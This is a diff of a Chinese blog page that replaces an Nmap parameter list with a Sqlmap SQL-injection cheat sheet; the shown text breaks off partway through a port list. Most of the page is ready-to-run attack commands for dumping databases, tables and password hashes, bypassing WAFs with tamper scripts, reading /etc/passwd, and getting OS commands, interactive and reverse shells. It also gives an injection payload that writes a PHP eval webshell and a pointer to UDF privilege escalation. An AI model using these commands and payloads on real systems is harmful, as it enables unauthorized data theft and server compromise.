@@ -89,18 +89,18 @@
 
 
 
-<meta name="description" content="nmap 语法结构：nmap [Scan Type(s)] [Options] {target specification} 端口状态介绍 open：确定端口开放，可达 closed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。 filtered ：由于包过滤阻止探测报文到达端口，Nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，">
+<meta name="description" content="sqlmap -u #注入点 -f #指纹判别数据库类型 -b #获取数据库版本信息 -p #指定可测试的参数(?page=1&amp;amp;id=2 -p “page,id”) -D “” #指定数据库名 -T “” #指定表名 -C “” #指定字段 -s “” #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log”　　恢复:-s “xx.log” –resume) –co">
 <meta name="keywords" content="Tools">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Nmap常用参数">
-<meta property="og:url" content="https://winthorlimo.github.io/note/2020/undefined30/868037e0.html">
+<meta property="og:title" content="Sqlmap常用参数">
+<meta property="og:url" content="https://winthorlimo.github.io/2020/06/519cc.html">
 <meta property="og:site_name" content="离沫凌天๓">
-<meta property="og:description" content="nmap 语法结构：nmap [Scan Type(s)] [Options] {target specification} 端口状态介绍 open：确定端口开放，可达 closed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。 filtered ：由于包过滤阻止探测报文到达端口，Nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，">
+<meta property="og:description" content="sqlmap -u #注入点 -f #指纹判别数据库类型 -b #获取数据库版本信息 -p #指定可测试的参数(?page=1&amp;amp;id=2 -p “page,id”) -D “” #指定数据库名 -T “” #指定表名 -C “” #指定字段 -s “” #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log”　　恢复:-s “xx.log” –resume) –co">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-08-20T09:26:34.136Z">
+<meta property="og:updated_time" content="2020-08-20T09:26:26.214Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Nmap常用参数">
-<meta name="twitter:description" content="nmap 语法结构：nmap [Scan Type(s)] [Options] {target specification} 端口状态介绍 open：确定端口开放，可达 closed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。 filtered ：由于包过滤阻止探测报文到达端口，Nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，">
+<meta name="twitter:title" content="Sqlmap常用参数">
+<meta name="twitter:description" content="sqlmap -u #注入点 -f #指纹判别数据库类型 -b #获取数据库版本信息 -p #指定可测试的参数(?page=1&amp;amp;id=2 -p “page,id”) -D “” #指定数据库名 -T “” #指定表名 -C “” #指定字段 -s “” #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log”　　恢复:-s “xx.log” –resume) –co">
 
 
 
@@ -130,13 +130,13 @@
 
 
 
-  <link rel="canonical" href="https://winthorlimo.github.io/note/2020/undefined30/868037e0.html">
+  <link rel="canonical" href="https://winthorlimo.github.io/2020/06/519cc.html">
 
 
 
 
 
-  <title>Nmap常用参数 | 离沫凌天๓</title>
+  <title>Sqlmap常用参数 | 离沫凌天๓</title>
   
 
 
@@ -305,7 +305,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://winthorlimo.github.io/note/2020/undefined30/868037e0.html">
+    <link itemprop="mainEntityOfPage" href="https://winthorlimo.github.io/2020/06/519cc.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="离沫凌天๓">
@@ -322,7 +322,7 @@
 
         
         
-          <h2 class="post-title" itemprop="name headline">Nmap常用参数</h2>
+          <h2 class="post-title" itemprop="name headline">Sqlmap常用参数</h2>
         
 
         <div class="post-meta">
@@ -334,7 +334,7 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-30T18:10:05+08:00">
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-30T18:09:05+08:00">
                 2020-06-30
               </time>
             
@@ -390,7 +390,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.6k
+                  2.6k
                 </span>
               
 
@@ -406,7 +406,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  6
+                  12
                 </span>
               
             </div>
@@ -427,95 +427,174 @@
       
 
       
-        <h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><ul>
-<li>语法结构：nmap [Scan Type(s)] [Options] {target specification}</li>
-<li>端口状态介绍<ul>
-<li>open：确定端口开放，可达</li>
-<li>closed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。</li>
-<li>filtered ：由于包过滤阻止探测报文到达端口，Nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。</li>
-<li>unfiltered ：未被过滤状态意味着端口可访问，但是Nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。</li>
-<li>open | filtered ：无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null 等扫描会引起。</li>
-<li>closed|filtered：（关闭或者被过滤的）：无法确定端口是关闭的还是被过滤的</li>
+        <h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><ul>
+<li>-u #注入点</li>
+<li>-f #指纹判别数据库类型</li>
+<li>-b #获取数据库版本信息</li>
+<li>-p #指定可测试的参数(?page=1&amp;id=2 -p “page,id”)</li>
+<li>-D “” #指定数据库名</li>
+<li>-T “” #指定表名</li>
+<li>-C “” #指定字段</li>
+<li>-s “” #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log”　　恢复:-s “xx.log” –resume)</li>
+<li>–columns #列出字段-</li>
+<li>–current-user #获取当前用户名称</li>
+<li>–current-db #获取当前数据库名称</li>
+<li>–users #列数据库所有用户</li>
+<li>–passwords #数据库用户所有密码</li>
+<li>–privileges #查看用户权限(–privileges -U root)</li>
+<li>-U #指定数据库用户</li>
+<li>–dbs #列出所有数据库</li>
+<li>–tables -D “” #列出指定数据库中的表</li>
+<li>–columns -T “user” -D “mysql” #列出mysql数据库中的user表的所有字段</li>
+<li>–dump-all #列出所有数据库所有表</li>
+<li>–exclude-sysdbs #只列出用户自己新建的数据库和表</li>
+<li>–dump -T “” -D “” -C “” #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname)</li>
+<li>–dump -T “” -D “” –start 2 –top 4 # 列出指定数据库的表的2-4字段的数据<br>–dbms #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB)</li>
+<li>–os #指定系统(Linux,Windows)</li>
+<li>-v #详细的等级(0-6)<ul>
+<li>0：只显示Python的回溯，错误和关键消息。</li>
+<li>1：显示信息和警告消息。</li>
+<li>2：显示调试消息。</li>
+<li>3：有效载荷注入。</li>
+<li>4：显示HTTP请求。</li>
+<li>5：显示HTTP响应头。</li>
+<li>6：显示HTTP响应页面的内容</li>
 </ul>
 </li>
-<li>扫描目标格式<ul>
-<li>示例： scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254</li>
-<li>-iL:从文件中加载目标</li>
-<li>-iR:随机扫描</li>
-<li>–exclude <host or network>:排除网段或主机地址</host></li>
-<li>–excledefile:排除文件中的地址</li>
+<li>–privileges #查看权限</li>
+<li>–is-dba #是否是数据库管理员</li>
+<li>–roles #枚举数据库用户角色</li>
+<li>–udf-inject #导入用户自定义函数（获取系统权限）</li>
+<li>–union-check #是否支持union 注入</li>
+<li>–union-cols #union 查询表记录</li>
+<li>–union-test #union 语句测试</li>
+<li>–union-use #采用union 注入</li>
+<li>–union-tech orderby #union配合order by</li>
+<li>–method “POST” –data “” #POST方式提交数据(–method “POST” –data “page=1&amp;id=2″)</li>
+<li>–cookie “用;号分开” #cookie注入(–cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”)</li>
+<li>–referer “” #使用referer欺骗(–referer “<a href="http://www.baidu.com" target="_blank" rel="noopener">http://www.baidu.com</a>”)</li>
+<li>–user-agent “” #自定义user-agent</li>
+<li>–proxy “<a href="http://127.0.0.1:8118" target="_blank" rel="noopener">http://127.0.0.1:8118</a>″ #代理注入</li>
+<li>–string “” #指定关键词</li>
+<li>–threads 　　 #采用多线程(–threads 3)</li>
+<li>–sql-shell #执行指定sql命令</li>
+<li>–sql-query #执行指定的sql语句(–sql-query “SELECT password FROM mysql.user WHERE user = ‘root’ LIMIT 0, 1″ )</li>
+<li>–file-read #读取指定文件</li>
+<li>–file-write #写入本地文件(–file-write /test/test.txt –file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt)</li>
+<li>–file-dest #要写入的文件绝对路径</li>
+<li>–os-cmd=id #执行系统命令</li>
+<li>–os-shell #系统交互shell</li>
+<li>–os-pwn #反弹shell(–os-pwn –msf-path=/opt/framework/msf3/)</li>
+<li>–msf-path= #matesploit绝对路径(–msf-path=/opt/framework/msf3/)</li>
+<li>–os-smbrelay #</li>
+<li>–os-bof #</li>
+<li>–reg-read #读取win系统注册表</li>
+<li>–priv-esc #</li>
+<li>–time-sec= #延迟设置 默认–time-sec=5 为5秒</li>
+<li>-p “user-agent” –user-agent “sqlmap/0.7rc1 (<a href="http://sqlmap.sourceforge.net" target="_blank" rel="noopener">http://sqlmap.sourceforge.net</a>)” #指定user-agent注入</li>
+<li>–eta #盲注</li>
 </ul>
-</li>
-<li>主机发现<ul>
-<li>-sL:列出需要扫描的目标，不扫描</li>
-<li>-sn:只做ping扫描，不做端口扫描</li>
-<li>-Pn：跳过主机发现，视所有主机都在线</li>
-<li>-PS/PA/PU/PY[portlist]：基于TCP（SYN、ACK）、UDP、SCTP的指定端口的主机发现</li>
-<li>-PE/PP/PM：基于ICMP的echo、timestamp、network request的主机发现</li>
-<li>-PO[Protocol list]：基于IP协议字段的ping扫描</li>
-<li>-n/-R: -n表示不对目标最DNS解析，-R表示进行DNS解析，缺省为必要时候进行DNS解析</li>
-<li>–dns-servers &lt;serv1[,serv2],…&gt;: 指定DNS 服务器</li>
-<li>–system-dns:调用系统的DNS服务器</li>
-<li>–traceroute：显示追踪到目标的路径</li>
+<h3 id="1-基础用法"><a href="#1-基础用法" class="headerlink" title="1. 基础用法"></a>1. 基础用法</h3><ul>
+<li>./sqlmap.py -u “注入地址” -v 1 –dbs   // 列举数据库</li>
+<li>./sqlmap.py -u “注入地址” -v 1 –current-db   // 当前数据库</li>
+<li>./sqlmap.py -u “注入地址” -v 1 –users    // 列数据库用户</li>
+<li>./sqlmap.py -u “注入地址” -v 1 –current-user  // 当前用户</li>
+<li>./sqlmap.py -u “注入地址” -v 1 –tables -D “数据库”   // 列举数据库的表名</li>
+<li>./sqlmap.py -u “注入地址” -v 1 –columns -T “表名” -D “数据库”   // 获取表的列名</li>
+<li>./sqlmap.py -u “注入地址” -v 1 –dump -C “字段,字段” -T “表名” -D “数据库”   // 获取表中的数据，包含列<br>已经开始拖库了，SQLMAP是非常人性化的，它会将获取的数据存储sqlmap/output/中</li>
 </ul>
-</li>
-<li>扫描技术<ul>
-<li>-sS/sT/sA/sW/sM:TCP扫描<ul>
-<li>S是SYN扫描，半连接扫描，nmap只发送SYN报文，通过服务器是否响应SYN+ACK来判断对应端口是否开放</li>
-<li>T是全连接扫描会和服务器建立完整的三次握手，效率低</li>
-<li>A发送ACK报文，通过服务器响应来判断是否开放，有的服务器不开会回复ICMP端口不可达，当回复RST时表示可能被拦截或者端口开放，不是一个准确的判断条件</li>
-<li>W 是窗口扫描，发出的报文和ACK一样，利用的是在某些系统中如果端口开放，收到ACK包后会响应一个窗口非0的RST包</li>
-<li>M是Maimon扫描，使用发现者的名字命名。其原理是向目标服务器发送FIN/ACK 报文，在某些系统中如果端口开放则会丢弃该报文不做响应，如果端口关闭则回复RST或者ICMP，Nmap可借此判断服务器端口的开放情况。不准</li>
-</ul>
-</li>
-<li>-sU：UDP扫描，某些系统如果UDP端口不开放会回复ICMP差错报文（这也是Linux系统中traceroute的实现原理）。Nmap UDP端口扫描的强大之处在于它会针对知名端口构造初始交互报文，比如会针对UDP 500构造一个主模式协商的IKE报文</li>
-<li>-sN/sF/sX:特定TCP标志位的扫描，N是空标志位；F是FIN置位；X是Xmas扫描将FIN、PSH、URG同时置位。收到RST说明端口关闭，无响应说明被过滤或者端口开放，不准。</li>
-<li>–scanflags <flags>：实现上同上面几种类似，可以让用户自定义TCP标志位。</flags></li>
-<li>-sI <zombie host[:probeport]>: Idle扫描需要一台没有流量的僵尸主机，这种扫描的实现原理是在一定的时间里，同一台主机发出的IP数据报文其ip头中的identification字段是累加的。探测分为3步：1、Nmap主机向僵尸机发包，通过僵尸机的响应包探测其ID；2、Nmap主机伪造僵尸机源地址向服务器的特定端口发送SYN包；3、Nmap主机再次探测僵尸机的ip.id。如果目标服务器端口开放，则必然会向僵尸机发送SYN/ACK，由于莫名其妙收到一个SYN/ACK 报文，僵尸机会向目标服务器发送RST报文，该报文的ip.id 是第一步+1，则第三步Nmap主机探测到的ip.id应该是第一步+2，说明目标主机端口开放。反之，如果目标主机端口未开放，则收到第二步的报文后会向僵尸机回复RST或者直接丢弃该报文不响应，无论哪种情况，都不会触发僵尸机发包，进而僵尸机的ip.id不会变化，第三步Nmap探测到的id应该是第一步+1.</zombie></li>
-<li>-sY/sZ:SCTP协议INIT或cookie-echo扫描</li>
-<li>-sO:基于IP协议的扫描，通过变换IP报文头中的Protocol值来对服务器进行探测</li>
-<li>-b <ftp relay host>:：FTP反弹扫描，借助FTP特性，通过FTP服务器连接想要扫描的主机实现隐身的目的</ftp></li>
-</ul>
-</li>
-<li>端口相关参数<ul>
-<li>-p:指定端口扫描范围，如：-p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9</li>
-<li>–exclude-ports <port ranges>: 排除端口</port></li>
-<li>-F：扫描比缺省少的端口（缺省1000，加了-F100）</li>
-<li>-r：顺序扫描端口，缺省是随机分组扫描</li>
-<li>–top-ports <number>:按top排序扫描知名端口</number></li>
-<li>–port-ratio <ratio>: 按比例扫描知名端口，值在0-1之间，越小扫的越多</ratio></li>
-</ul>
-</li>
-<li>系统/版本探测<ul>
-<li>-sV:探测开放的端口的系统/服务信息</li>
-<li>–version-intensity <level>:设置版本检测的详程度级别，0-9，越高越详细</level></li>
-<li>–version-light：输出最可能的版本信息，缺省是2</li>
-<li>–version-all：使用所有的探测条件进行版本/系统探测</li>
-<li>–version-trace:打印详细的版本扫描过程</li>
-</ul>
-</li>
-<li>脚本扫描<ul>
-<li>–script=<lua scripts>:指定脚本名称</lua></li>
-<li>–script-args=&lt;n1=v1,[n2=v2,…]&gt;:为脚本指定参数</li>
-<li>–script-help=<lua scripts>: 查看脚本帮助信息</lua></li>
-<li>–script-updatedb:更新脚本数据库</li>
-</ul>
-</li>
-<li>系统探测<ul>
-<li>-O:激活系统探测</li>
-<li>–osscan-limit:只对开放端口的有效主机进行系统探测</li>
-<li>–osscan-guess：推测系统信息</li>
-</ul>
-</li>
-<li>其他<ul>
-<li>-T<0-5>:时间模板，越大速度越快</0-5></li>
-<li>-6：使能IPV6探测</li>
-<li>-A：使能系统探测、版本检测、脚本扫描、路由追踪</li>
-<li>-V：打印版本号</li>
-<li>-v：增加输出的详细程度</li>
-</ul>
+<h3 id="2-sqlmap-post注入"><a href="#2-sqlmap-post注入" class="headerlink" title="2. sqlmap post注入"></a>2. sqlmap post注入</h3><ul>
+<li>在使用Sqlmap进行post型注入时，<br>经常会出现请求遗漏导致注入失败的情况。<br>一个小技巧，即结合burpsuite来使用sqlmap，<br>用这种方法进行post注入测试会更准确，操作起来也非常容易。<ol>
+<li>浏览器打开目标地址http:// <a href="http://www.2cto.com" target="_blank" rel="noopener">www.2cto.com</a> /Login.asp</li>
+<li>配置burp代理(127.0.0.1:8080)以拦截请求</li>
+<li>点击login表单的submit按钮</li>
+<li>如下图，这时候Burp会拦截到了我们的登录POST请求</li>
+<li>把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</li>
+<li>运行sqlmap并使用如下命令：<br>./sqlmap.py -r search-test.txt -p tfUPass<br>这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，<br>而-p 大家应该比较熟悉，指定注入用的参数。</li>
+</ol>
 </li>
 </ul>
+<h3 id="3-sqlmap-cookies注入"><a href="#3-sqlmap-cookies注入" class="headerlink" title="3. sqlmap  cookies注入"></a>3. sqlmap  cookies注入</h3><ul>
+<li>sqlmap.py -u “<a href="http://127.0.0.1/base.php&quot;" target="_blank" rel="noopener">http://127.0.0.1/base.php&quot;</a> –cookies “id=1”  –dbs –level 2</li>
+<li>默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值&gt;=2的时候也会检查cookie时面的参数，当&gt;=3的时候将检查User-agent和Referer，那么这就很简单了，我们直接在原有的基础  上面加上 –level 2 即可<br>利用sqlmap cookies注入突破用户登录继续注入<br>先把用户登陆的cookie拿到吧，<br>在收藏夹添加一个链接cookies属性：<br>名字自己取<br>javascript:alert(document.cookie)，，需要获取当前cookie的时候，<br>直接点一下这个链接，然后复制一下弹出对话框<br>里的cookie值就搞定了<br>sqlmap.py -u <a href="http://x.x.x.x/Down.aspx?tid=2" target="_blank" rel="noopener">http://x.x.x.x/Down.aspx?tid=2</a> -p tid –dbms mssql –cookie=”info=username=test”<br>-p是指指定参数注入</li>
+</ul>
+<h3 id="4-sqlmap遇到url重写的注入"><a href="#4-sqlmap遇到url重写的注入" class="headerlink" title="4. sqlmap遇到url重写的注入"></a>4. sqlmap遇到url重写的注入</h3><ul>
+<li>哪里存在注入就加上 <em>号<br>./sqlmap.py -u “<a href="http://www.cunlide.com/id1/1" target="_blank" rel="noopener">http://www.cunlide.com/id1/1</a></em>/id2/2”</li>
+</ul>
+<h3 id="5-sqlmap-编码绕waf注入"><a href="#5-sqlmap-编码绕waf注入" class="headerlink" title="5. sqlmap 编码绕waf注入"></a>5. sqlmap 编码绕waf注入</h3><p>在sqlmap 的 tamper目录下有很多space2morehash.py 编码脚本自行加载</p>
+<ul>
+<li>./sqlmap.py -u <a href="http://127.0.0.1/test.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/test.php?id=1</a> -v 3 –dbms “MySQL” –technique U -p id –batch –tamper “space2morehash.py”</li>
+</ul>
+<p>sqlmap读文件</p>
+<ul>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–file-read “/etc/passwd”</li>
+</ul>
+<p>sqlmap写文件</p>
+<ul>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–file-write /localhost/mm.php –file-dest/var/www/html/xx.php -v 2</li>
+</ul>
+<p>sqlmap分段脱裤</p>
+<ul>
+<li>sqlmap.py -u url -D “data”  -T “tables” -C “username,password,email” –dump –threads=5 –start=1 –stop=5000<br>其他基础：</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;" target="_blank" rel="noopener">http://url/news?id=1&quot;</a> –level=3 –smart –dbms “Mysql” –current-user #获取当前用户名称</li>
+<li>sqlmap -u “<a href="http://www.xxoo.com/news?id=1&quot;" target="_blank" rel="noopener">http://www.xxoo.com/news?id=1&quot;</a> –level=3 –smart –dbms “Mysql” –current-db  #获取当前数据库名称</li>
+<li>sqlmap -u “<a href="http://www.xxoo.com/news?id=1&quot;" target="_blank" rel="noopener">http://www.xxoo.com/news?id=1&quot;</a> –level=3 –smart –dbms “Mysql”–tables  -D “db_name” #列表名</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;" target="_blank" rel="noopener">http://url/news?id=1&quot;</a> –level=3 –smart  –dbms “Mysql” –columns -T “tablename” users-D “db_name” -v 0 #列字段</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;" target="_blank" rel="noopener">http://url/news?id=1&quot;</a> –level=3 –smart –dbms “Mysql”  –dump  -C “column_name”  -T “table_name” -D “db_name” -v 0   #获取字段内容</li>
+</ul>
+<h2 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h2><ul>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –users  #列数据库用户</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –dbs#列数据库</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–passwords #数据库用户密码</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–passwords-U root  -v 0 #列出指定用户数据库密码</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –dump-all -v 0 #列出所有数据库所有表</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–privileges #查看权限</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–privileges -U root #查看指定用户权限</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –is-dba -v 1 #是否是数据库管理员</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –roles #枚举数据库用户角色</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–udf-inject #导入用户自定义函数（获取系统权限！）</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–dump-all –exclude-sysdbs -v 0 #列出当前库所有表</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” - –union-check #是否支持union 注入</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–union-cols #union 查询表记录</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –union-test #union 语句测试</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –union-use –banner #采用union 注入</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–union-test –union-tech orderby #union 配合 order by</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–method “POST” – data “id=1&amp;cat=2” #post注入</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–cookie “COOKIE_VALUE” #cookie注入</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”-b #获取banner信息</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;" target="_blank" rel="noopener">http://url/news?id=1&quot;</a> –level=3 –smart-v 1 -f #指纹判别数据库类型</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;" target="_blank" rel="noopener">http://url/news?id=1&quot;</a> –level=3 –smart–proxy”<a href="http://127.0.0.1:8118&quot;" target="_blank" rel="noopener">http://127.0.0.1:8118&quot;</a> #代理注入</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--string&quot;STRING_ON_TRUE_PAGE&quot;" target="_blank" rel="noopener">http://url/news?id=1&quot;--string&quot;STRING_ON_TRUE_PAGE&quot;</a>  #指定关键词</li>
+<li><p>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–sql-shell #执行指定sql命令</p>
+</li>
+<li><p>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–os-cmd=whoami #执行系统命令</p>
+</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–os-shell #系统交互shell</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–os-pwn #反弹shell</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–reg-read #读取win系统注册表</li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –dbs-o “sqlmap.log” #保存进度</li>
+<li><p>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –dbs  -o “sqlmap.log” –resume  #恢复已保存进度</p>
+</li>
+<li><p>./sqlmap.py -u “<a href="http://www.91ri.org/" target="_blank" rel="noopener">http://www.91ri.org/</a> id1/1*/id2/2″<br>“Show.asp” –cookie “id=9” –table –level 2<br>–forms<br>–data “data”<br>–delay 0.5<br>–safe-freq  25<br>-v 3 –dbs  –batch –tamper “base64encode.py”<br>sqlmap.py -u url -D “data”  -T “tables” -C “username,password,email” –dump-all -v</p>
+</li>
+</ul>
+<h2 id="传统的sql语句写shell"><a href="#传统的sql语句写shell" class="headerlink" title="传统的sql语句写shell"></a>传统的sql语句写shell</h2><p>通过sql注入select into outfile实现，如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,&apos;&lt;?php eval($_POST[a]);?&gt;&apos; INTO OUTFILE &apos;/var/www/tmp/nb.php&apos;#</span><br></pre></td></tr></table></figure>
+<p>dumpfile、file_put_contents</p>
+<p>outfile不能用了怎么办？<code>select unhex(&#39;udf.dll hex code&#39;) into dumpfile &#39;c:/mysql/mysqlserver 5.1/lib/plugin/xxoo.dll&#39;</code>;可以 UDF提权<a href="https://www.cnblogs.com/milantgh/p/5444398.html" target="_blank" rel="noopener">https://www.cnblogs.com/milantgh/p/5444398.html</a></p>
+<p>outfile适合导库，在行末会写入新行并转义，因此不能写入二进制可执行文件。</p>
+<p>写shell条件</p>
+<ul>
+<li>文件名必须是绝对路径</li>
+<li>用户必须有写文件权限</li>
+</ul>
+<h2 id="sqlmap写shell"><a href="#sqlmap写shell" class="headerlink" title="sqlmap写shell"></a>sqlmap写shell</h2><p>前提需要对目录具有写权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--os-cmd=&quot;net user&quot;</span><br></pre></td></tr></table></figure>
+<p>交互式命令执行，注意在使用交互式方式时需知道网站的绝对路径，执行成功后在绝对路径下创建文件返回结果，然后再自动删除。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--os-shell</span><br></pre></td></tr></table></figure>
+<p>写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell</p>
+<p>关闭sqlmap文件就会被删除</p>
+<h2 id="常见数据库端口号"><a href="#常见数据库端口号" class="headerlink" title="常见数据库端口号"></a>常见数据库端口号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Oracle 默认1521</span><br><span class="line"></span><br><span class="line">SQL Server 默认1433</span><br><span class="line"></span><br><span class="line">Mysql默认3306</span><br><span class="line"></span><br><span class="line">21 FTP</span><br><span class="line"></span><br><span class="line">22 ssh</span><br><span class="line"></span><br><span class="line">23 telnet</span><br><span class="line"></span><br><span class="line">25 smtp</span><br><span class="line"></span><br><span class="line">109 110 pop2 